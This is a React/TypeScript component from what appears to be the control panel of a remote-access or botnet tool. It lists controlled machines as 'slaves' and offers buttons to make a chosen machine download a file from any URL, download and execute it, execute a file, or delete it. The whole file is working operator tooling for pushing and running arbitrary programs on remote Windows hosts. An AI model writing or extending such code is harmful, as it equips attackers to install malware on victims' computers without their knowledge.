import {useState} from "react";
import Output from "./Output";
import {sendCommand} from "../utils/commandUtils";

interface SlaveData {
    freq : number;
    slaveIP : string;
    slaveLastCheckin : string;
    slaveName : string;
    slavePing : string;
    slaveStatus : string;
}

export default function DownloadManager({slave} : {
    slave: SlaveData
}) {
    const [downloadURL,
        setDownloadURL] = useState < string > ("https://www.7-zip.org/a/7z2409-x64.exe");
    const [downloadPath,
        setDownloadPath] = useState < string > ("C:/Users/User/Documents/7z2409-x64.exe");
    const [output,
        setOutput] = useState < string > (""); // Store API response
    const [isFetching,
        setIsFetching] = useState < boolean > (false); // Track if polling is active

    const handleSendCommand = (command : string) => {
        if (!downloadURL || !downloadPath) {
            alert("Please enter a valid download URL and path.");
            return;
        }

        setIsFetching(true); // Start loading state

        const fullCommand = `${command},${downloadURL},${downloadPath}`;
        sendCommand(slave.slaveName, fullCommand, (response) => {
            setOutput(response);
            setIsFetching(false); // Stop loading state when response is received
        });
    };

    return (
        <div className="w-full rounded-sm">
            <h1 className="text-xl font-bold mb-2">Download Manager</h1>

            <div className="flex flex-col md:flex-row gap-4 md:gap-x-6">
                {/* Input Fields */}
                <div className="w-full md:w-[600px]">
                    <input
                        type="url"
                        value={downloadURL}
                        onChange={(e) => setDownloadURL(e.target.value)}
                        className="bg-neutral-900 border border-lime-500 text-lime-400 text-sm rounded-sm block w-full p-1"
                        placeholder="http://download.com/file.exe"/>
                    <input
                        type="text"
                        value={downloadPath}
                        onChange={(e) => setDownloadPath(e.target.value)}
                        className="bg-neutral-900 border border-lime-500 text-lime-400 text-sm rounded-sm block w-full p-1"
                        placeholder="C:/Users/Public/Documents/example.exe"/>
                </div>

                {/* Buttons */}
                <div className="w-full md:w-[600px] grid grid-cols-1  md:grid-cols-2 gap-2">
                    <button
                        onClick={() => handleSendCommand("dl_only")}
                        className="bg-black border-2 border-lime-500 text-sm text-lime-400 outline outline-1 rounded-sm w-full p-1 ">
                        Download
                    </button>
                    <button
                        onClick={() => handleSendCommand("dl_exec")}
                        className="bg-black border-2 border-lime-500 text-sm text-lime-400 outline outline-1 rounded-sm w-full p-1">
                        Download & Execute
                    </button>
                    <button
                        onClick={() => handleSendCommand("exec_only")}
                        className="bg-black border-2 border-lime-500 text-sm text-lime-400 outline outline-1 rounded-sm w-full p-1">
                        Execute File
                    </button>
                    <button
                        onClick={() => handleSendCommand("delete")}
                        className="bg-black border-2 border-lime-500 text-sm text-lime-400 outline outline-1 rounded-sm w-full p-1">
                        Delete File
                    </button>
                </div>
            </div>

            {/* Show "Fetching response..." while waiting for output */}
            {isFetching && <p className="text-yellow-400 mt-4">Fetching response...</p>}

            {/* Show Output Response */}
            {output && <Output output={output}/>}
        </div>
    );
}
